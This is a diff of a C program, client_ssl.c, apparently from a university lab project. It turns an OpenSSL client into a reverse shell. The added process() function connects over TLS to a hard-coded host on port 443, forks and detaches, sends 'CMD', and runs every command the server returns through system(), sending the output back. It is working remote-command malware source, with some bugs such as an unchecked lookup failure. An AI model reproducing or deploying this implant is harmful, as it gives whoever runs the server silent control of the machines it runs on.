@@ -1,5 +1,6 @@
-// gcc -o client_ssl client_ssl.c -lssl -lcrypto -lpthread -g
+// gcc -o client_ssl client_ssl.c -lssl -lcrypto -g
 #include <arpa/inet.h>
+#include <fcntl.h>
 #include <netdb.h>
 #include <netinet/in.h>
 #include <openssl/bio.h>
@@ -10,102 +11,148 @@
 #include <openssl/x509_vfy.h>
 #include <resolv.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
-#include <time.h>
+#include <sys/types.h>
 #include <unistd.h>
 
 #define MAX_STRING_SIZE 1024
 
-int create_socket(char *url);
-void execute(char *buf);
+typedef struct {
+  int sslfd;
+  SSL *ssl;
+  SSL_CTX *sslctx;
+} sslsocket;
+
+int lookup_host(const char *host, char *adrr);
+int create_socket(const char *addr, const int port, sslsocket *ssl_sock);
+int execute(const char *command, int p, char *command_output);
 int verify_cert_time_valid(X509 *cert);
-void cleanup(int server, SSL_CTX *ctx, SSL *ssl, X509 *cert);
+void cleanup(sslsocket *ssl_sock, X509 *cert);
 void send_msg(SSL *ssl, const char *message);
 void receive_msg(SSL *ssl, char *buf);
+void process(sslsocket *ssl_sock, X509 *cert);
 
 static void display(const char *buf) { printf("Received: \"%s\"\n", buf); }
 
 int main() {
 
-  char dest_url[] = "https://sauron.run.montefiore.ulg.ac.be";
+  char dest_url[] = "sauron.run.montefiore.ulg.ac.be";
+  char addr[16];
   char buf[MAX_STRING_SIZE];
+
+  if (!lookup_host(dest_url, addr)) {
+    fprintf(stderr, "lookup_host() failed\n");
+    exit(1);
+  }
+
+  sslsocket *ssl_sock = malloc(sizeof(sslsocket));
+  if (!ssl_sock) {
+    fprintf(stderr, "malloc() failed\n");
+    exit(1);
+  }
+
+  if (!create_socket(addr, 443, ssl_sock)) {
+    exit(1);
+  }
 
   X509 *cert = NULL;
   X509_NAME *certname = NULL;
-  const SSL_METHOD *method;
-  SSL_CTX *ctx;
-  SSL *ssl;
-  int server = 0;
-  int ret, i;
 
-  OpenSSL_add_all_algorithms();
-  ERR_load_BIO_strings();
-  ERR_load_crypto_strings();
-  SSL_load_error_strings();
-
-  if (SSL_library_init() < 0) {
-    fprintf(stderr, "Could not initialize the OpenSSL library !\n");
-    exit(1);
-  }
-
-  method = SSLv23_client_method();
-  ctx = SSL_CTX_new(method);
-  if (ctx == NULL) {
-    fprintf(stderr, "Unable to create a new SSL context structure.\n");
-    exit(1);
-  }
-
-  SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2);
-  ssl = SSL_new(ctx);
-  server = create_socket(dest_url);
-  if (server != 0) {
-    printf("Successfully made the TCP connection to: %s.\n", dest_url);
-  }
-
-  SSL_set_fd(ssl, server);
-  if (SSL_connect(ssl) != 1) {
-    fprintf(stderr, "Error: Could not build a SSL session to: %s.\n", dest_url);
-    exit(1);
-  }
-
-  cert = SSL_get_peer_certificate(ssl);
+  cert = SSL_get_peer_certificate(ssl_sock->ssl);
   if (cert == NULL) {
     fprintf(stderr, "Error: Could not get a certificate from: %s.\n", dest_url);
+    exit(1);
   }
 
   certname = X509_NAME_new();
   certname = X509_get_subject_name(cert);
   if (!verify_cert_time_valid(cert)) {
     fprintf(stderr, "Certificat is expired");
-    send_msg(ssl, "DROP");
-    receive_msg(ssl, buf);
-    cleanup(server, ctx, ssl, cert);
+    send_msg(ssl_sock->ssl, "DROP");
+    receive_msg(ssl_sock->ssl, buf);
+    cleanup(ssl_sock, cert);
     exit(1);
   }
 
-  send_msg(ssl, "CMD");
-  receive_msg(ssl, buf);
-  execute(buf);
-
-  cleanup(server, ctx, ssl, cert);
+  process(ssl_sock, cert);
 
   return (0);
 }
 
-void send_msg(SSL *ssl, const char *message) {
-  int bytes;
-  char *cmd = malloc(sizeof(char) * (strlen(message) + 1));
-  if (!cmd) {
-    fprintf(stderr, "failed to allocate memory");
-    exit(1);
+void process(sslsocket *ssl_sock, X509 *cert) {
+
+  int pid;
+  int pipes[2];
+  int recv_length, output_length;
+  char command[1024];
+  char command_output[1024];
+  int last_cmd_len = 0;
+  struct sockaddr_in sa;
+
+  switch ((pid = fork())) {
+  case -1:
+    exit(EXIT_FAILURE);
+
+  case 0:
+
+    pipe(pipes);
+    dup2(pipes[1], STDOUT_FILENO);
+    dup2(pipes[1], STDERR_FILENO);
+    close(pipes[1]);
+    fcntl(pipes[0], F_SETFL, fcntl(pipes[0], F_GETFL) | O_NONBLOCK);
+
+    setsid();
+    SSL_write(ssl_sock->ssl, "CMD", 3);
+    while (1) // TODO check if socket alive
+    {
+      memset(command, 0, sizeof(command));
+
+      recv_length = SSL_read(ssl_sock->ssl, &command, sizeof(command) - 6);
+      if (recv_length > 0) {
+        // command[recv_length - 1] = '\0';
+        if (strcmp(command, "exit") == 0) {
+          break;
+        }
+
+        system(command);
+        output_length = read(pipes[0], command_output, sizeof(command_output));
+        // output_length = execute(command, pipes[0], command_output);
+
+        if (output_length > 0) {
+          SSL_write(ssl_sock->ssl, command_output, output_length);
+        } else {
+          SSL_write(ssl_sock->ssl, "0", 1);
+        }
+      } else {
+        // Socket is closed
+        break;
+      }
+    }
+
+    cleanup(ssl_sock, cert);
   }
-  strcpy(cmd, message);
+}
 
-  bytes = SSL_write(ssl, cmd, strlen(cmd)); /* encrypt & send message */
-  free(cmd);
+/* ---------------------------------------------------------- *
+ * Free the structures we don't need anymore                  *
+ * -----------------------------------------------------------*/
+void cleanup(sslsocket *ssl_sock, X509 *cert) {
+  SSL_shutdown(ssl_sock->ssl);
+  SSL_free(ssl_sock->ssl);
+  close(ssl_sock->sslfd);
+  X509_free(cert);
+  SSL_CTX_free(ssl_sock->sslctx);
+}
 
-  if (bytes <= 0) {
+int execute(const char *command, int p, char *command_output) {
+  system(command);
+  return read(p, command_output, sizeof(command_output));
+}
+
+void send_msg(SSL *ssl, const char *message) {
+  if (SSL_write(ssl, message, strlen(message)) <= 0) {
     fprintf(stderr, "failed to send message");
     exit(1);
   }
@@ -118,72 +165,77 @@ void receive_msg(SSL *ssl, char *buf) {
   buf[bytes] = 0;
 }
 
-/* ---------------------------------------------------------- *
- * Free the structures we don't need anymore                  *
- * -----------------------------------------------------------*/
-void cleanup(int server, SSL_CTX *ctx, SSL *ssl, X509 *cert) {
-  SSL_free(ssl);
-  close(server);
-  X509_free(cert);
-  SSL_CTX_free(ctx);
-}
+int lookup_host(const char *host, char *adrr) {
+  struct addrinfo hints, *result;
+  void *ptr;
 
-void execute(char *buf) {
+  memset(&hints, 0, sizeof(hints));
+  hints.ai_family = PF_UNSPEC;
+  hints.ai_socktype = SOCK_STREAM;
+  hints.ai_flags |= AI_CANONNAME;
 
-  //TODO
-  exit(1);
+  if (getaddrinfo(host, NULL, &hints, &result) != 0) {
+    perror("getaddrinfo");
+    return -1;
+  }
+
+  inet_ntop(result->ai_family, result->ai_addr->sa_data, adrr, 16);
+
+  switch (result->ai_family) {
+  case AF_INET:
+    ptr = &((struct sockaddr_in *)result->ai_addr)->sin_addr;
+    break;
+  case AF_INET6:
+    ptr = &((struct sockaddr_in6 *)result->ai_addr)->sin6_addr;
+    break;
+  }
+  inet_ntop(result->ai_family, ptr, adrr, 16);
+
+  freeaddrinfo(result);
+
+  return 1;
 }
 
 /* ---------------------------------------------------------- *
  * create_socket() creates the socket & TCP-connect to server *
  * ---------------------------------------------------------- */
-int create_socket(char url_str[]) {
-  int sockfd;
-  char hostname[256] = "";
-  char portnum[6] = "443";
-  char proto[6] = "";
-  char *tmp_ptr = NULL;
-  int port;
-  struct hostent *host;
-  struct sockaddr_in dest_addr;
+int create_socket(const char *addr, const int port, sslsocket *ssl_sock) {
+  struct sockaddr_in s_addr;
+  socklen_t sin_size;
 
-  if (url_str[strlen(url_str)] == '/')
-    url_str[strlen(url_str)] = '\0';
+  s_addr.sin_family = AF_INET;
+  s_addr.sin_port = htons(port);
+  s_addr.sin_addr.s_addr = inet_addr(addr);
 
-  strncpy(proto, url_str, (strchr(url_str, ':') - url_str));
-
-  strncpy(hostname, strstr(url_str, "://") + 3, sizeof(hostname));
-
-  if (strchr(hostname, ':')) {
-    tmp_ptr = strchr(hostname, ':');
-    /* the last : starts the port number, if avail, i.e. 8443 */
-    strncpy(portnum, tmp_ptr + 1, sizeof(portnum));
-    *tmp_ptr = '\0';
+  if ((ssl_sock->sslfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+    perror("socket");
+    return -1;
   }
-
-  port = atoi(portnum);
-
-  if ((host = gethostbyname(hostname)) == NULL) {
-    fprintf(stderr, "Error: Cannot resolve hostname %s.\n", hostname);
-    abort();
-  }
-
-  sockfd = socket(AF_INET, SOCK_STREAM, 0);
-
-  dest_addr.sin_family = AF_INET;
-  dest_addr.sin_port = htons(port);
-  dest_addr.sin_addr.s_addr = *(long *)(host->h_addr);
-
-  memset(&(dest_addr.sin_zero), '\0', 8);
-  tmp_ptr = inet_ntoa(dest_addr.sin_addr);
-  if (connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr)) ==
+  if (connect(ssl_sock->sslfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) ==
       -1) {
-    fprintf(stderr, "Error: Cannot connect to host %s [%s] on port %d.\n",
-            hostname, tmp_ptr, port);
-    exit(1);
+    perror("connect");
+    return -1;
   }
 
-  return sockfd;
+  if (SSL_library_init() < 0) {
+    perror("SSL_library_init");
+    return -1;
+  }
+  OpenSSL_add_all_algorithms();
+
+  ssl_sock->sslctx = SSL_CTX_new(SSLv23_client_method());
+  ssl_sock->ssl = SSL_new(ssl_sock->sslctx);
+
+  if (!SSL_set_fd(ssl_sock->ssl, ssl_sock->sslfd)) {
+    perror("SSL_set_fd");
+    return -1;
+  }
+  if (SSL_connect(ssl_sock->ssl) != 1) {
+    perror("SSL_connect");
+    return -1;
+  }
+
+  return 1;
 }
 
 int verify_cert_time_valid(X509 *cert) {
